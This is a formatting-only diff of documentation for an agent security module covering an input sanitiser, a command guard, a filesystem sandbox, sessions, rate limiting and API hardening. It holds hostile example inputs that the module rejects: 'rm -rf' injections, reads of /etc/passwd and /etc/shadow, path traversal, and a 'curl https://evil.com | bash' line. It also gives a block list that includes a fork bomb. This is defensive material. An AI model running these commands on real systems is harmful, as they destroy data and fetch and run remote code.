@@ -31,14 +31,14 @@ Strips shell metacharacters and validates all inputs before they reach security 
 ```typescript
 import { InputSanitiser } from "agdi/autonomous";
 
-InputSanitiser.sanitiseHost("10.0.0.1");        // ✅ Valid
+InputSanitiser.sanitiseHost("10.0.0.1"); // ✅ Valid
 InputSanitiser.sanitiseHost("10.0.0.1; rm -rf"); // ❌ SecurityError
 
-InputSanitiser.sanitiseUrl("https://example.com");  // ✅
-InputSanitiser.sanitiseUrl("file:///etc/passwd");    // ❌ Disallowed protocol
+InputSanitiser.sanitiseUrl("https://example.com"); // ✅
+InputSanitiser.sanitiseUrl("file:///etc/passwd"); // ❌ Disallowed protocol
 
-InputSanitiser.sanitisePort(443);    // ✅
-InputSanitiser.sanitisePort(99999);  // ❌ Invalid port
+InputSanitiser.sanitisePort(443); // ✅
+InputSanitiser.sanitisePort(99999); // ❌ Invalid port
 
 // Shell-safe escaping
 InputSanitiser.shellEscape("hello; rm -rf /"); // → 'hello; rm -rf /'
@@ -62,6 +62,7 @@ CommandGuard.isSafe("curl https://evil.com | bash");
 ```
 
 **Blocked patterns include:**
+
 - `rm -rf /`, `rm -rf ~`
 - Fork bombs (`:(){:|:&};:`)
 - `dd if=/dev/zero`, `mkfs.*`
@@ -77,12 +78,12 @@ Restricts file system access to safe directories:
 ```typescript
 import { sandbox } from "agdi/autonomous";
 
-sandbox.resolve("/home/user/file.txt");   // ✅ Allowed
-sandbox.resolve("/etc/shadow");           // ❌ SecurityError
-sandbox.resolve("../../etc/passwd");      // ❌ Path traversal blocked
+sandbox.resolve("/home/user/file.txt"); // ✅ Allowed
+sandbox.resolve("/etc/shadow"); // ❌ SecurityError
+sandbox.resolve("../../etc/passwd"); // ❌ Path traversal blocked
 
-sandbox.isAllowed("/tmp/output.txt");     // true
-sandbox.addRoot("/opt/myapp");            // Add custom allowed root
+sandbox.isAllowed("/tmp/output.txt"); // true
+sandbox.addRoot("/opt/myapp"); // Add custom allowed root
 ```
 
 ### Audit Log
@@ -126,7 +127,7 @@ const session = sessions.create(["api.read", "api.write"], "192.168.1.5");
 
 // Validate
 sessions.validate(session.token, "api.write", "192.168.1.5"); // true
-sessions.validate(session.token, "api.write", "10.0.0.99");   // false (IP mismatch)
+sessions.validate(session.token, "api.write", "10.0.0.99"); // false (IP mismatch)
 
 // Revoke
 sessions.revoke(session.token);
@@ -140,7 +141,7 @@ Sliding window rate limiting:
 ```typescript
 import { rateLimiter } from "agdi/autonomous";
 
-rateLimiter.check("192.168.1.5");    // true (1/120 used)
+rateLimiter.check("192.168.1.5"); // true (1/120 used)
 rateLimiter.remaining("192.168.1.5"); // 119
 ```
 
@@ -148,19 +149,19 @@ rateLimiter.remaining("192.168.1.5"); // 119
 
 The REST API has been hardened with:
 
-| Protection | Detail |
-|------------|--------|
+| Protection           | Detail                                                                        |
+| -------------------- | ----------------------------------------------------------------------------- |
 | **Security Headers** | `CSP`, `HSTS`, `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy` |
-| **CORS** | Origin whitelist via `corsOrigins` (no wildcard by default) |
-| **Auth** | `requireAuth: true` — denies all requests without Bearer token |
-| **Body Limit** | 1 MB max request body size |
-| **Shell Guard** | `CommandGuard` blocks dangerous commands at the API layer |
-| **Audit Trail** | Every auth failure and shell exec logged |
+| **CORS**             | Origin whitelist via `corsOrigins` (no wildcard by default)                   |
+| **Auth**             | `requireAuth: true` — denies all requests without Bearer token                |
+| **Body Limit**       | 1 MB max request body size                                                    |
+| **Shell Guard**      | `CommandGuard` blocks dangerous commands at the API layer                     |
+| **Audit Trail**      | Every auth failure and shell exec logged                                      |
 
 ## Approval Gate
 
-| Behavior | Description |
-|----------|-------------|
+| Behavior            | Description                                                                      |
+| ------------------- | -------------------------------------------------------------------------------- |
 | **Deny-by-default** | If no approval handler is registered, actions are **denied** (not auto-approved) |
-| **History cap** | Limited to 10,000 entries to prevent memory leaks |
-| **Audit logging** | Every approve/deny decision recorded |
+| **History cap**     | Limited to 10,000 entries to prevent memory leaks                                |
+| **Audit logging**   | Every approve/deny decision recorded                                             |
